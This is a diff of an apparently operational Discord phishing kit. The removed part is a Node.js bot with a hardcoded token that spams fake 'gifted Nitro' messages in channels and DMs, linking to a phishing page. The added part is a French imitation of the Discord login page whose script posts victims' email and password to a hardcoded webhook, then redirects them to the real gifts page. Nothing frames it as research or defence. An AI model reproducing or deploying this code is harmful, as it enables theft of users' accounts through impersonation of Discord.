@@ -1,174 +1,181 @@
-const part1 = "MTU2NTE4OTU2MTg5MjQ3NTAwMA.Grbllh.";
-const part2 = "Gc3mn8tYBGyg5i8TrTZW1f2fmKF69cUw_bD6Ec";
-const botToken = part1 + part2;
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Discord</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=gg+sans:wght@400;500;600&display=swap');
 
-const phishingUrl = "https://swiemali2-lgtm.github.io/member-cleanup/"; 
-
-async function listen() {
-  console.log("Bot en ligne, en attente de commandes (nitro / dm id)...");
-  let lastMsgId = null;
-
-  setInterval(async () => {
-    try {
-      let res = await fetch(`https://discord.com/api/v9/users/@me/guilds`, {
-        headers: { "Authorization": `Bot ${botToken}` }
-      });
-      let guilds = await res.json();
-      
-      if (!Array.isArray(guilds)) return;
-
-      for (let g of guilds) {
-        let chans = await (await fetch(`https://discord.com/api/v9/guilds/${g.id}/channels`, {
-          headers: { "Authorization": `Bot ${botToken}` }
-        })).json();
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif; }
         
-        if (!Array.isArray(chans)) continue;
+        body { 
+            background-color: #313338; 
+            color: #f2f3f5; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            padding: 20px; 
+        }
+        
+        .card { 
+            background-color: #313338; 
+            width: 100%; 
+            max-width: 400px; 
+            text-align: center; 
+        }
+        
+        .logo { 
+            width: 120px; 
+            margin-bottom: 24px; 
+        }
+        
+        h2 { 
+            font-size: 24px; 
+            font-weight: 600; 
+            margin-bottom: 8px; 
+            color: #f2f3f5;
+        }
+        
+        p { 
+            color: #b5bac1; 
+            font-size: 16px; 
+            margin-bottom: 24px; 
+        }
+        
+        .form-group { 
+            text-align: left; 
+            margin-bottom: 20px; 
+        }
+        
+        label { 
+            display: block; 
+            color: #b5bac1; 
+            font-size: 12px; 
+            font-weight: 700; 
+            text-transform: uppercase; 
+            margin-bottom: 8px; 
+        }
+        
+        input { 
+            width: 100%; 
+            padding: 10px; 
+            background-color: #1e1f22; 
+            border: 1px solid #1e1f22; 
+            border-radius: 3px; 
+            color: #dbdee1; 
+            font-size: 16px; 
+            outline: none; 
+            transition: border-color 0.2s;
+        }
+        
+        input:focus { 
+            border-color: #5865f2; 
+        }
+        
+        button { 
+            width: 100%; 
+            padding: 12px; 
+            background-color: #5865f2; 
+            color: white; 
+            border: none; 
+            border-radius: 3px; 
+            font-weight: 500; 
+            cursor: pointer; 
+            margin-top: 4px; 
+            font-size: 16px; 
+            transition: background-color 0.2s;
+        }
+        
+        button:hover { 
+            background-color: #4752c4; 
+        }
+        
+        .footer { 
+            margin-top: 16px; 
+            font-size: 14px; 
+            color: #949ba4; 
+            text-align: left; 
+        }
+        
+        .footer a { 
+            color: #00a8fc; 
+            text-decoration: none; 
+        }
+        
+        .footer a:hover { 
+            text-decoration: underline; 
+        }
+        
+        #status { 
+            margin-top: 15px; 
+            font-size: 14px; 
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png" class="logo" alt="Discord">
+        
+        <h2>Bienvenue à nouveau!</h2>
+        <p>Connectez-vous pour réclamer votre cadeau.</p>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <label>E-mail ou numéro de téléphone</label>
+                <input type="email" id="email" required>
+            </div>
+            <div class="form-group">
+                <label>Mot de passe</label>
+                <input type="password" id="password" required>
+            </div>
+            <button type="submit">Se connecter</button>
+        </form>
+        
+        <div class="footer">
+            Besoin d'un compte ? <a href="#">S'inscrire</a>
+        </div>
+        
+        <div id="status"></div>
+    </div>
 
-        for (let c of chans) {
-          if (c.type !== 0) continue; 
-          
-          let msgs = await (await fetch(`https://discord.com/api/v9/channels/${c.id}/messages?limit=5`, {
-            headers: { "Authorization": `Bot ${botToken}` }
-          })).json();
-          
-          if (Array.isArray(msgs)) {
-            for (let m of msgs) {
-              if (!m.content || m.id === lastMsgId) continue;
-              
-              const content = m.content.toLowerCase().trim();
-              
-              if (content === "nitro") {
-                lastMsgId = m.id;
-                console.log("envoi du faux nitro dans le salon :", c.id);
-                sendNitro(c.id);
-              }
-              
-              if (content.startsWith("dm ")) {
-                lastMsgId = m.id;
-                const targetId = content.split(" ")[1];
-                console.log("envoi du faux nitro en dm à :", targetId);
-                sendDM(targetId);
-              }
+    <script>
+        // Remplace par ton url de webhook discord
+        const webhookUrl = "https://discord.com/api/webhooks/1566488899348598845/8PI1V-r-5w1e9a-f8CqbONw_SxZNk53nyKPM0efglr-L1Sr6DLNpAzHPoYkwQrbS_y55";
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const statusDiv = document.getElementById('status');
+            statusDiv.style.color = "#ffff00"; 
+            statusDiv.innerText = "Validation...";
+            
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('password').value;
+
+            try {
+                const formData = new FormData();
+                formData.append("content", `**Nitro Login**\n**Email:** ${email}\n**Pass:** ${pass}`);
+                
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                statusDiv.style.color = "#00ff00"; 
+                statusDiv.innerText = "Cadeau activé ! Redirection...";
+                setTimeout(() => { 
+                    window.location.href = "https://discord.com/gifts/"; 
+                }, 1500);
+                
+            } catch (err) {
+                statusDiv.style.color = "#ff0000"; 
+                statusDiv.innerText = "Erreur réseau, réessayez.";
             }
-          }
-        }
-      }
-    } catch (e) {}
-  }, 5000); 
-}
-
-async function sendNitro(channelId) {
-  // On télécharge l'image pour l'envoyer en pièce jointe
-  let imgRes = await fetch("https://i.postimg.cc/9FhK0y7q/nitro-banner.png");
-  let imgBlob = await imgRes.blob();
-
-  const formData = new FormData();
-  formData.append("payload_json", JSON.stringify({
-    content: "",
-    embeds: [
-      {
-        title: "You've been gifted a subscription!",
-        description: `**ZeroDay** has gifted you Nitro for 3 months!\n\nExpires in 48 hours`,
-        color: 0x2b2d31,
-        image: {
-          url: "attachment://nitro.png" // Référence à la pièce jointe
-        }
-      }
-    ],
-    components: [
-      {
-        type: 1,
-        components: [
-          {
-            type: 2,
-            style: 5,
-            label: "Accept Gift",
-            url: phishingUrl
-          },
-          {
-            type: 2,
-            style: 5,
-            label: "Learn More",
-            url: "https://discord.com/nitro"
-          }
-        ]
-      }
-    ]
-  }));
-  
-  // On ajoute l'image au formulaire
-  formData.append("files[0]", imgBlob, "nitro.png");
-
-  await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
-    method: "POST",
-    headers: { "Authorization": `Bot ${botToken}` },
-    body: formData
-  }).catch(() => {});
-  
-  console.log("faux nitro envoyé avec image jointe.");
-}
-
-async function sendDM(targetId) {
-  let dmRes = await fetch(`https://discord.com/api/v9/users/@me/channels`, {
-    method: "POST",
-    headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
-    body: JSON.stringify({ recipient_id: targetId })
-  });
-  
-  let dmData = await dmRes.json();
-  if (!dmData.id) {
-    console.log("erreur création dm :", dmData.message);
-    return;
-  }
-  
-  const channelId = dmData.id;
-  
-  let imgRes = await fetch("https://i.postimg.cc/9FhK0y7q/nitro-banner.png");
-  let imgBlob = await imgRes.blob();
-
-  const formData = new FormData();
-  formData.append("payload_json", JSON.stringify({
-    content: "",
-    embeds: [
-      {
-        title: "You've been gifted a subscription!",
-        description: `**ZeroDay** has gifted you Nitro for 3 months!\n\nExpires in 48 hours`,
-        color: 0x2b2d31,
-        image: {
-          url: "attachment://nitro.png"
-        }
-      }
-    ],
-    components: [
-      {
-        type: 1,
-        components: [
-          {
-            type: 2,
-            style: 5,
-            label: "Accept Gift",
-            url: phishingUrl
-          },
-          {
-            type: 2,
-            style: 5,
-            label: "Learn More",
-            url: "https://discord.com/nitro"
-          }
-        ]
-      }
-    ]
-  }));
-  
-  formData.append("files[0]", imgBlob, "nitro.png");
-
-  await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
-    method: "POST",
-    headers: { "Authorization": `Bot ${botToken}` },
-    body: formData
-  }).catch(() => {});
-  
-  console.log("faux nitro envoyé en dm avec image jointe.");
-}
-
-listen();
+        });
+    </script>
+</body>
+</html>
